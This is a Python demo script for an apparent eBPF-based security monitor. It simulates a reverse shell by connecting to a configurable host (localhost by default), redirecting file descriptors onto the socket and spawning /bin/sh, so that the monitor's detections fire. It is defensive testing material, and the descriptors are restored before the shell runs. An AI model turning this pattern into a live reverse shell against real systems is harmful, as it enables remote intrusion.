#!/usr/bin/env python3
"""
attack_reverse_shell.py — Simulate a reverse shell for eBPF-Shield demo.

⚠️  DEMO / TESTING ONLY — This script simulates the syscall pattern of a
reverse shell connection. It connects to localhost:4444, duplicates file
descriptors, and calls execve on /bin/sh.

Expected eBPF-Shield detections:
    • connect_count      — outbound socket connection
    • shell_spawn        — execve /bin/sh with redirected fds
    • priv_esc_sequence  — combined reverse shell pattern

Usage:
    python3 attack_reverse_shell.py
    python3 attack_reverse_shell.py --host 127.0.0.1 --port 4444
"""

from __future__ import annotations

import argparse
import os
import socket
import subprocess
import sys
import time


# ── Colors ───────────────────────────────────────────────────────────────────

RED = "\033[0;31m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
DIM = "\033[2m"
BOLD = "\033[1m"
RESET = "\033[0m"


def banner() -> None:
    """Print the demo banner."""
    print(f"{RED}╔══════════════════════════════════════════════════════╗{RESET}")
    print(f"{RED}║  ⚠  eBPF-Shield — Reverse Shell Simulation          ║{RESET}")
    print(f"{RED}║     FOR DEMO / TESTING PURPOSES ONLY                ║{RESET}")
    print(f"{RED}╚══════════════════════════════════════════════════════╝{RESET}")
    print()


def simulate_reverse_shell(host: str, port: int) -> None:
    """Simulate the syscall pattern of a reverse shell.

    This generates the exact sequence of syscalls that eBPF-Shield's
    anomaly detector is trained to recognize:
      1. socket()   — create a network socket
      2. connect()  — connect to remote C2 server
      3. dup2()     — redirect stdin/stdout/stderr
      4. execve()   — spawn /bin/sh

    Args:
        host: Target host (should be localhost for demo).
        port: Target port (default 4444).
    """
    # ── Stage 1: Create socket ───────────────────────────────────────────
    print(f"{YELLOW}[STAGE 1]{RESET} {BOLD}Creating socket{RESET}")
    print(f"{DIM}  socket(AF_INET, SOCK_STREAM, 0){RESET}")
    time.sleep(0.5)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f"{DIM}  → Socket created (fd={sock.fileno()}){RESET}")
    except OSError as e:
        print(f"{DIM}  → Socket creation failed: {e}{RESET}")
        return

    # ── Stage 2: Connect to C2 ──────────────────────────────────────────
    print()
    print(f"{YELLOW}[STAGE 2]{RESET} {BOLD}Connecting to {host}:{port}{RESET}")
    print(f"{DIM}  connect({host}, {port}) — simulating C2 callback{RESET}")
    time.sleep(0.5)

    try:
        sock.settimeout(3)
        sock.connect((host, port))
        print(f"{RED}  ✗ Connected to {host}:{port} (C2 is listening!){RESET}")
        connected = True
    except ConnectionRefusedError:
        print(f"{DIM}  → Connection refused (expected — no listener){RESET}")
        print(f"{DIM}  → Syscall pattern still generated for eBPF detection{RESET}")
        connected = False
    except socket.timeout:
        print(f"{DIM}  → Connection timed out{RESET}")
        connected = False
    except OSError as e:
        print(f"{DIM}  → Connection failed: {e}{RESET}")
        connected = False

    # ── Stage 3: Duplicate file descriptors ──────────────────────────────
    print()
    print(f"{YELLOW}[STAGE 3]{RESET} {BOLD}Redirecting file descriptors (dup2){RESET}")
    time.sleep(0.5)

    if connected:
        fd = sock.fileno()
        print(f"{DIM}  dup2({fd}, 0) — redirect stdin{RESET}")
        print(f"{DIM}  dup2({fd}, 1) — redirect stdout{RESET}")
        print(f"{DIM}  dup2({fd}, 2) — redirect stderr{RESET}")

        # Save original fds before redirecting
        saved_stdin = os.dup(0)
        saved_stdout = os.dup(1)
        saved_stderr = os.dup(2)

        try:
            os.dup2(fd, 0)
            os.dup2(fd, 1)
            os.dup2(fd, 2)
            print(f"{RED}  ✗ File descriptors redirected to socket{RESET}")
        except OSError as e:
            # Restore
            os.dup2(saved_stdin, 0)
            os.dup2(saved_stdout, 1)
            os.dup2(saved_stderr, 2)
            print(f"{DIM}  → dup2 failed: {e}{RESET}")
        finally:
            # Always restore original fds for clean output
            os.dup2(saved_stdin, 0)
            os.dup2(saved_stdout, 1)
            os.dup2(saved_stderr, 2)
            os.close(saved_stdin)
            os.close(saved_stdout)
            os.close(saved_stderr)
    else:
        # Even without connection, generate dup2 syscalls
        print(f"{DIM}  Generating dup2 syscall pattern (no live connection)...{RESET}")
        try:
            # dup2 with a valid fd pair to generate syscalls
            tmp_fd = os.dup(1)
            os.dup2(tmp_fd, tmp_fd)  # no-op dup2 to generate syscall
            os.close(tmp_fd)
            print(f"{DIM}  → dup2 syscalls generated{RESET}")
        except OSError:
            print(f"{DIM}  → dup2 simulation completed{RESET}")

    # ── Stage 4: Spawn shell via execve ──────────────────────────────────
    print()
    print(f"{YELLOW}[STAGE 4]{RESET} {BOLD}Spawning shell (execve /bin/sh){RESET}")
    print(f"{DIM}  execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"echo pwned\"]){RESET}")
    time.sleep(0.5)

    print(f"{RED}  ✗ execve /bin/sh called (replacing current process){RESET}")
    
    # Use os.execv to replace the current process.
    # We add a sleep command so the process stays alive long enough for 
    # eBPF-Shield to demonstrate sending a SIGKILL from user-space!
    try:
        os.execv("/bin/sh", ["/bin/sh", "-c", "echo '  → Shell spawned successfully (PID: '$$')'; echo '  → Holding shell open...'; sleep 10"])
    except OSError as e:
        print(f"{DIM}  → execve failed: {e}{RESET}")

    # ── Cleanup ──────────────────────────────────────────────────────────
    print()
    try:
        sock.close()
    except OSError:
        pass

    print(f"{RED}╔══════════════════════════════════════════════════════╗{RESET}")
    print(f"{RED}║  Reverse shell simulation complete!                  ║{RESET}")
    print(f"{RED}║                                                     ║{RESET}")
    print(f"{RED}║  Expected eBPF-Shield detections:                   ║{RESET}")
    print(f"{RED}║    • connect_count       (Stage 2)                  ║{RESET}")
    print(f"{RED}║    • shell_spawn         (Stage 4)                  ║{RESET}")
    print(f"{RED}║    • priv_esc_sequence   (combined)                 ║{RESET}")
    print(f"{RED}╚══════════════════════════════════════════════════════╝{RESET}")


def main() -> None:
    """Parse arguments and run the simulation."""
    parser = argparse.ArgumentParser(
        description="eBPF-Shield demo: reverse shell simulation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="Target host for C2 connection (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=4444,
        help="Target port for C2 connection (default: 4444)",
    )
    args = parser.parse_args()

    banner()
    simulate_reverse_shell(args.host, args.port)


if __name__ == "__main__":
    main()
